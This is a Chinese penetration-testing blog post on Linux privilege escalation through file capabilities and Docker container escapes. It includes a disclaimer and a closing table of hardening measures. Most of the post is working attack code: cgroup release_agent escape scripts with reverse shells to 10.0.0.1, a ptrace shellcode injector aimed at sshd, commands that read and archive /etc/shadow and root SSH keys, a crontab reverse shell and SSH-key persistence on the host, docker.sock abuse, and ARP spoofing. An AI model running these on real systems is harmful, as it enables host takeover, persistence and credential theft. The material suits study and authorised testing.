---
title: Linux提权：Capabilities与容器逃逸
date: 2024-10-15 08:00:00
tags:
  - 云安全
  - 权限提升
  - 渗透测试
description: Linux Capabilities 与容器逃逸提权——特权能力利用、Docker 特权模式与 docker.sock 挂载逃逸。
categories: 渗透测试
---

## 前言

Linux Capabilities 将 root 超级权限拆分为细粒度能力单元，本意是实现最小权限原则。但在实际渗透中，错误配置的 Capabilities 和容器环境往往成为提权的捷径。本文系统梳理基于 Capabilities 的本地提权手法，以及 Docker 环境下的四种经典容器逃逸路径。

> **免责声明**：本文所述技术仅供安全研究与授权测试使用。未经授权对他人系统进行测试属于违法行为，作者不承担任何法律责任。

## 一、Capabilities 基础

Linux 将传统 root 权限划分为 40 余种独立能力，关键概念：

| 概念 | 说明 |
|------|------|
| Permitted Set | 进程允许使用的能力集合 |
| Effective Set | 当前实际生效的能力（内核检查此集合） |
| Bounding Set | 进程所能拥有的能力上限 |
| Ambient Set | 非特权程序 execve 后仍能保留的能力（Linux 4.3+） |

文件可通过 `setcap` 附加能力，存储在扩展属性中：

```bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.8 cap_setuid+ep
/usr/bin/ping cap_net_raw+ep
```

## 二、getcap 枚举

```bash
# 递归搜索所有具备文件 Capabilities 的可执行文件
getcap -r / 2>/dev/null

# 筛选高危 Capabilities
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_ptrace|cap_dac_read_search|cap_setuid|cap_net_raw|cap_sys_module'

# 检查进程 Capabilities
cat /proc/self/status | grep Cap
capsh --print

# 自动化工具
linpeas.sh  # https://github.com/peass-ng/PEASS-ng
linux-exploit-suggester-2 --capabilities
```

高危 Capabilities 速查：

| Capability | 风险 | 提权路径 |
|---|---|---|
| cap_sys_admin | 严重 | 挂载、namespace 操作 |
| cap_sys_ptrace | 严重 | 注入任意进程内存 |
| cap_dac_read_search | 高 | 绕过权限读取任意文件 |
| cap_setuid | 严重 | 直接 setuid(0) |
| cap_sys_module | 严重 | 加载任意内核模块 |
| cap_net_raw | 中 | 原始套接字、网络嗅探 |

## 三、Capabilities 提权实战

### 3.1 cap_sys_admin

最危险的 Capability 之一，涵盖挂载、namespace 操作等数十个子功能。

**cgroup release_agent 提权**：

```bash
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
# 写入 payload 到容器可访问路径（宿主机视角）
echo '#!/bin/sh' > /release_payload
echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /release_payload
chmod +x /release_payload
echo "$host_path/release_payload" > /tmp/cgrp/release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**挂载宿主机磁盘**：

```bash
# 容器内利用 cap_sys_admin 挂载宿主机根分区
fdisk -l
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### 3.2 cap_sys_ptrace

允许 ptrace 调试任意进程，可直接注入代码到 root 进程：

```bash
# 编译 ptrace 注入工具
cat > ptrace_inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <string.h>

int main(int argc, char **argv) {
    pid_t target = atoi(argv[1]);
    char shellcode[] = "\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f"
                       "\x73\x68\x00\x53\x48\x89\xe7\x48\x31\xf6"
                       "\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";
    struct user_regs_struct regs, saved;
    unsigned long sc_addr;

    ptrace(PTRACE_ATTACH, target, NULL, NULL);
    wait(NULL);
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    memcpy(&saved, &regs, sizeof(regs));

    sc_addr = regs.rsp - 1024;
    for (int i = 0; i < sizeof(shellcode); i += 8)
        ptrace(PTRACE_POKEDATA, target, sc_addr + i,
               *(unsigned long *)(shellcode + i));

    regs.rip = sc_addr;
    ptrace(PTRACE_SETREGS, target, NULL, &regs);
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    return 0;
}
EOF
gcc -o ptrace_inject ptrace_inject.c
./ptrace_inject $(pgrep -f "sshd" | head -1)
```

### 3.3 cap_dac_read_search

绕过所有文件读取权限检查，直接读取敏感文件：

```bash
# Python 读取 shadow
python3 -c "
with open('/etc/shadow', 'r') as f:
    print(f.read())
"
# 读取 root SSH 私钥
python3 -c "print(open('/root/.ssh/id_rsa').read())"
# 打包敏感文件
tar -cvf /tmp/stolen.tar /etc/shadow /root/.ssh/
```

### 3.4 cap_net_raw

允许创建原始套接字，用于网络嗅探和中间人攻击：

```bash
tcpdump -i eth0 -w /tmp/capture.pcap
tcpdump -i eth0 -A | grep -iE "password|token|auth"
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

## 四、Docker 容器逃逸

### 4.1 --privileged 模式逃逸

`--privileged` 赋予容器几乎所有 Capabilities 并解除设备 cgroup 限制：

```bash
# 检测是否为 privileged 模式
cat /proc/self/status | grep CapEff
fdisk -l 2>/dev/null    # 能看到宿主机磁盘即为 privileged

# 逃逸步骤
fdisk -l                          # 确认宿主机磁盘 /dev/sda1
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# 写 crontab 反弹 shell
echo '* * * * * root bash -c "bash -i >& /dev/tcp/10.0.0.1/5555 0>&1"' \
    >> /mnt/host/etc/crontab
# 或添加 SSH 公钥
echo "ssh-rsa AAA..." >> /mnt/host/root/.ssh/authorized_keys
```

### 4.2 docker.sock 挂载逃逸

宿主机 `/var/run/docker.sock` 被挂载进容器后，容器可操控宿主机 Docker 守护进程：

```bash
# 检测
ls -la /var/run/docker.sock
curl --unix-socket /var/run/docker.sock http://localhost/version

# 手法一：启动新容器挂载宿主机根文件系统
docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host /bin/sh

# 手法二：以 privileged + host PID 启动新容器
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \
    alpine nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 手法三：通过 Docker API 创建容器
cat > container.json << EOF
{"Image":"alpine","Cmd":["/bin/sh","-c","chroot /mnt/host /bin/sh"],
 "HostConfig":{"Binds":["/:/mnt/host"]},"SecurityOpt":["apparmor=unconfined"]}
EOF
curl -X POST --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" -d @container.json \
    http://localhost/containers/create
# 替换 CONTAINER_ID 后启动
curl -X POST --unix-socket /var/run/docker.sock \
    http://localhost/containers/CONTAINER_ID/start
```

### 4.3 cgroup release_agent 逃逸

最经典的容器逃逸方式之一，利用 cgroup v1 `release_agent` 机制在宿主机以 root 执行命令。前置条件：容器拥有 CAP_SYS_ADMIN 且 cgroup 可写。

```bash
#!/bin/bash
# === 完整逃逸脚本 ===
PAYLOAD='#!/bin/sh
bash -i >& /dev/tcp/10.0.0.1/7777 0>&1'

# 挂载 cgroup
mkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir -p /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# 获取 OverlayFS upperdir（容器文件系统在宿主机的实际路径）
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "[*] Host path: $host_path"

# 写入 payload
echo "$PAYLOAD" > /tmp/payload.sh
chmod +x /tmp/payload.sh
echo "$host_path/tmp/payload.sh" > /tmp/cgrp/release_agent

# 触发：进程退出 → cgroup 释放 → release_agent 以宿主机 root 执行
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
echo "[+] Payload triggered."
```

攻击流程图：

```
容器内 ① mount cgroup → ② notify_on_release=1
       → ③ 获取 upperdir 路径（宿主机视角）
       → ④ 写 /tmp/payload.sh
       → ⑤ release_agent=<host_path>/tmp/payload.sh
       → ⑥ 进程退出 → 宿主机 root 执行 payload → 反弹 shell
```

### 4.4 /proc 文件系统挂载逃逸

当容器以 `--pid=host` 或挂载宿主机 `/proc` 时：

```bash
# 手法一：nsenter 加入宿主机全部命名空间（需要 --pid=host）
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# 手法二：通过 /proc/1/root 访问宿主机根文件系统
cat /proc/1/root/etc/shadow
echo "ssh-rsa AAA..." > /proc/1/root/root/.ssh/authorized_keys

# 手法三：修改宿主机内核参数
echo 1 > /proc/sys/net/ipv4/ip_forward    # 开启 IP 转发实现 MitM
```

## 五、检测与防御

### 检测命令

```bash
capsh --print                        # 查看当前 Capabilities
cat /proc/1/status | grep Cap        # 检查权限位
mount | grep -E 'docker.sock|/proc|/dev/sd'  # 敏感挂载
cat /proc/1/status | grep Seccomp    # 0=disabled, 2=filter
aa-status 2>/dev/null                # AppArmor 状态
```

### 防御建议

| 层面 | 措施 |
|---|---|
| Capabilities | 遵循最小权限，避免 `--cap-add=ALL` |
| Privileged | 禁止 `--privileged`，按需添加具体能力 |
| docker.sock | 严禁将 Docker socket 挂载到容器 |
| 只读根文件系统 | `--read-only` 阻止写入恶意脚本 |
| AppArmor / SELinux | 启用强制访问控制 |
| seccomp | 自定义 profile，阻断危险系统调用 |
| User Namespace | `--userns-remap` 将容器 root 映射到宿主机非特权用户 |
| no-new-privileges | `--security-opt=no-new-privileges` 阻止子进程获取新能力 |

## 六、总结

Linux Capabilities 虽将 root 拆分，`cap_sys_admin`、`cap_sys_ptrace` 等依然具备近乎 root 的危险性。文件 Capabilities 的错误配置是本地提权的常见入口。在容器场景中，逃逸往往由三个要素促成：**过多的 Capabilities + 共享的宿主机资源 + 缺乏强制访问控制**。理解这些攻击手法是构建纵深防御的前提。

更多技术参考：[GTFOBins](https://gtfobins.github.io/)、[HackTricks](https://book.hacktricks.xyz/)。

*本文更新于 2024 年 10 月，部分利用手法可能随内核版本和容器运行时更新而失效。*
